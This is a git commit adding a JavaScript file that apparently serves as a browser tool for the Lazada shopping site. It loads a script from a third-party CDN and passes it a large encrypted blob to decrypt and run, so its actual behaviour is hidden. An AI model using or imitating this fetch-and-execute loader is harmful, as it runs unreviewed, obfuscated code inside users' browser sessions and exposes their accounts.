7a95986be989fbb8ef3230ce5c780635efb95490
IM Frandy D Putra <60122275+frandy008@users.noreply.github.com>
2021-01-25 23:06:30 +0800

    Initial commit

---
+++ lazada_tengkulak_slayer_v1_by_def.js
@@ -0,0 +1,86 @@
+(function() {
+    var jq = document.createElement("script");
+    jq.src = 'https://code.jquery.com/jquery-3.5.1.min.js';
+    var script = document.createElement("script");
+    script.src = 'https://rawcdn.githack.com/frandy008/memedi_inside/2462d9547809ca47fd69f736abdf12dc5ffc2952/memedi_library_enc.js';
+    script.type = 'text/javascript';
+    script.onload = function() {
+        memedi.inside(`AF827BF3040AA5A743E715E481EFBAB76C3B690E1034341539635C65665EBE21`,`#####  Encrypted: Memedi Inside Tools Security #####
+        ?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
+        YxE+nSlWyyQhvN0dZpCK1G80aQ==?64b
+        #####  End encrypted message  #####
+        `);
+    }
+    document.getElementsByTagName("head")[0].appendChild(jq);
+    document.getElementsByTagName("head")[0].appendChild(script);
+}
+)();
